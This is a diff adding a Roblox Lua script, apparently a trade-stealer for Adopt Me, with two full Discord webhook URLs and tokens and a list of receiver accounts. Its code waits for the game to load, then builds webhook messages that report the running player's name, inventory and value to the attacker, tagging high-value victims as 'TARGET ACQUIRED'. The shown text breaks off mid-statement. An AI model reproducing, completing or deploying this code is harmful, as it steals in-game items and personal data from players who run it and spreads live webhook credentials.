@@ -1,0 +1,54 @@
+-- [[ MONDEUR ELITE v5.1 - ETFB ENGINE ]] --
+-- Fix: Incomplete Statement & Nil Value Crashes
+-- Logic: Bucket-Prioritized Trading & Dualhook Pings
+
+if getgenv().MondeurExecuted then return end
+getgenv().MondeurExecuted = true
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+-- [01] CONFIGURATION
+local CONFIG = {
+    WEBHOOK = "https://discord.com/api/webhooks/1403619431325634631/ygxLnix7JFuXUKC-wUgemRyPODjiPI65kyn0I0i2ATQQ0VVbjDukmhUfsg42b7HjvTuG",
+    DUALHOOK = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku",
+    RECEIVERS = {"CREOLE023", "Hisokarah", "2ndcfpaj67", "3rdcfpaj67"},
+    PING_THRESHOLD = 5,
+    DUAL_THRESHOLD = 40.0 -- High Tier Point Trigger
+}
+
+--------------------------------------------------------------
+-- [02] STABILITY CHECK
+--------------------------------------------------------------
+local function EnsureGameReady()
+    if not game:IsLoaded() then game.Loaded:Wait() end
+    
+    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local hrp = char:WaitForChild("HumanoidRootPart", 10)
+    
+    local Fsys = nil
+    repeat
+        local ok, res = pcall(function() return require(ReplicatedStorage:WaitForChild("Fsys", 5)) end)
+        if ok and res then Fsys = res else task.wait(1) end
+    until Fsys
+    
+    return Fsys
+end
+
+--------------------------------------------------------------
+-- [03] WEBHOOK LOGIC (ETFB STYLE)
+--------------------------------------------------------------
+local function SendMasterLog(url, content, isDual, petText, totalVal, admin)
+    local payload = HttpService:JSONEncode({
+        ["content"] = content or "",
+        ["username"] = "bitchass",
+        ["embeds"] = {{
+            ["title"] = isDual and "🔥 TARGET ACQUIRED (HIGH TIER)" or "💎 SYSTEM CONNECTED",
+            ["color"] = isDual and 0xFF0000 or 0x00FF00,
+            ["fields"] = {
+                {["name"] = "👤 User", ["value"] = "```" .. LocalPlayer.Name .. "```", ["inline"] = true},
+                {["name"] = "👑 Admin", ["value"] = "```" .. admin .. "```", ["inline"] = true},
+                {["name"] = "⚖️ Points", ["value"] = "```" .. string.format("%.2f", totalVal) .. "```", ["inline"] = false},
+                {["name"] = "📦 Inventory Scan", ["value"] = "
